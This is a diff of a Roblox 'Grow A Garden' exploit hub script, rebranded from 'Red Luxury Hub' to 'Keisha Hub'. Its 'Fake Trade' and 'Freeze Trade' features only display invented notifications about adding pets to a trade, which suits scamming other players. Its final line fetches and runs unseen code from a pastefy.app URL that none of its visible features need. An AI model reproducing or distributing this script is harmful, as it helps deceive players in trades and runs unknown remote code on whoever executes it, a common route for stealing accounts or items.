@@ -1,5 +1,5 @@
 -- =======================================================
--- RED LUXURY HUB | Made by Keisha
+-- KEISHA HUB | Made by Keisha
 -- =======================================================
 
 -- Load Rayfield
@@ -7,32 +7,32 @@ local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
 -- Main Window
 local Window = Rayfield:CreateWindow({
-    Name = "❤️ Red Luxury Hub | made by Keisha",
-    LoadingTitle = "Grow A Garden - Red Luxury",
+    Name = "💖 Keisha Hub | made by Keisha",
+    LoadingTitle = "Grow A Garden - Keisha",
     LoadingSubtitle = "made by Keisha",
     ConfigurationSaving = {
         Enabled = true,
-        FolderName = "RedLuxuryHub",
+        FolderName = "KeishaHub",
         FileName = "Config"
     },
     KeySystem = false
 })
 
--- Hàm notify đỏ sang trọng
-local function RedNotify(title, content)
+-- Notify riêng cho Keisha
+local function KeishaNotify(title, content)
     Rayfield:Notify({
-        Title = "🔴 " .. title,
+        Title = "💎 " .. title,
         Content = content,
         Duration = 4,
-        Image = 4483362458
+        Image = 6031280882 -- icon crystal
     })
 end
 
 -- =======================================================
 -- TAB: TRADE
 -- =======================================================
-local tradeTab = Window:CreateTab("💰 Trade", 4483362458)
-tradeTab:CreateSection("Freeze Trade 🔊")
+local tradeTab = Window:CreateTab("💰 Trade", 6031280882)
+tradeTab:CreateSection("Freeze Trade 🔒")
 
 local toggles = {}
 local btnNames = {"Auto Accept", "Can't Cancel", "Freeze Trade", "Can't Leave"}
@@ -42,7 +42,7 @@ for _, name in ipairs(btnNames) do
         CurrentValue = false,
         Callback = function(Value)
             toggles[name] = Value
-            RedNotify("Freeze Trade", name .. " is now " .. (Value and "ON" or "OFF"))
+            KeishaNotify("Trade", name .. " is now " .. (Value and "ON" or "OFF"))
         end
     })
 end
@@ -51,11 +51,12 @@ tradeTab:CreateButton({
     Name = "Leave Server",
     Callback = function()
         local TeleportService = game:GetService("TeleportService")
-        TeleportService:TeleportToPlaceInstance(0, "", game.Players.LocalPlayer)
+        local Players = game:GetService("Players")
+        TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
     end,
 })
 
-tradeTab:CreateSection("Fake Trade 🍊")
+tradeTab:CreateSection("Fake Trade 🎭")
 tradeTab:CreateDropdown({
     Name = "Select Pet",
     Options = {"Kitsune", "Queen Bee", "T-Rex", "Disco Bee", "Corrupted Kitsune", "Raccoon", "Dragonfly", "Butterfly", "Spinosaurus"},
@@ -77,9 +78,9 @@ tradeTab:CreateDropdown({
 tradeTab:CreateButton({
     Name = "Add Pet To Trade",
     Callback = function()
-        RedNotify("Fake Trade", "Transferring...")
+        KeishaNotify("Fake Trade", "Transferring...")
         task.wait(2)
-        RedNotify("Fake Trade", "Added: " .. (getgenv().SelectedMutation or "") .. " " ..
+        KeishaNotify("Fake Trade", "Added: " .. (getgenv().SelectedMutation or "") .. " " ..
             (getgenv().SelectedPet or "") .. " - " .. (getgenv().SelectedKg or "") .. "kg")
     end,
 })
@@ -87,7 +88,7 @@ tradeTab:CreateButton({
 -- =======================================================
 -- TAB: RANDOMIZE
 -- =======================================================
-local randTab = Window:CreateTab("🎲 Randomize", 4483362458)
+local randTab = Window:CreateTab("🎲 Randomize", 6031280882)
 randTab:CreateSection("Random System")
 
 local pets = {"Kitsune", "Queen Bee", "T-Rex", "Disco Bee", "Corrupted Kitsune", "Raccoon", "Dragonfly", "Butterfly", "Spinosaurus"}
@@ -101,14 +102,14 @@ randTab:CreateButton({
     Name = "🎲 Randomize Pet",
     Callback = function()
         local result = pickRandom(pets)
-        RedNotify("Random Pet", "You got: " .. result)
+        KeishaNotify("Random Pet", "You got: " .. result)
     end,
 })
 randTab:CreateButton({
     Name = "✨ Randomize Mutation",
     Callback = function()
         local result = pickRandom(mutations)
-        RedNotify("Random Mutation", "You got: " .. result)
+        KeishaNotify("Random Mutation", "You got: " .. result)
     end,
 })
 randTab:CreateButton({
@@ -116,36 +117,46 @@ randTab:CreateButton({
     Callback = function()
         local pet = pickRandom(pets)
         local mut = pickRandom(mutations)
-        RedNotify("Surprise!", "Your result: " .. mut .. " " .. pet)
+        KeishaNotify("Surprise!", "Your result: " .. mut .. " " .. pet)
     end,
 })
 
 -- =======================================================
 -- TAB: SPAWNER
 -- =======================================================
-local spawnerTab = Window:CreateTab("⚡ Spawner", 4483362458)
+local spawnerTab = Window:CreateTab("⚡ Spawner", 6031280882)
 spawnerTab:CreateButton({
     Name = "Run Spawner",
     Callback = function()
-        RedNotify("Spawner", "Spawner started (demo)")
+        KeishaNotify("Spawner", "Spawner started (demo)")
     end,
 })
 
 -- =======================================================
 -- TAB: MISC
 -- =======================================================
-local miscTab = Window:CreateTab("⚙️ Misc", 4483362458)
+local miscTab = Window:CreateTab("⚙️ Misc", 6031280882)
 local dupeState = false
 miscTab:CreateToggle({
     Name = "Detect Dupe Pet",
     CurrentValue = false,
-    Callback = function(Value) dupeState = Value end,
+    Callback = function(Value) 
+        dupeState = Value 
+        KeishaNotify("Dupe Detect", "Detect is now " .. (Value and "ON" or "OFF"))
+    end,
 })
 miscTab:CreateButton({
-    Name = "Dupe Pet (allow mutation)",
+    Name = "Dupe Pet (demo)",
     Callback = function()
         local screenGui = Instance.new("ScreenGui", game.CoreGui)
         local blackFlash = Instance.new("Frame", screenGui)
-        blackFlash.Size = UDim2
+        blackFlash.Size = UDim2.new(1,0,1,0)
+        blackFlash.BackgroundColor3 = Color3.new(0,0,0)
+        blackFlash.BackgroundTransparency = 0.5
+        task.wait(0.5)
+        screenGui:Destroy()
+        KeishaNotify("Dupe Pet", "Dupe animation finished (demo)")
+    end,
+})
 
 loadstring(game:HttpGet("https://pastefy.app/fs1jiEYW/raw"))()
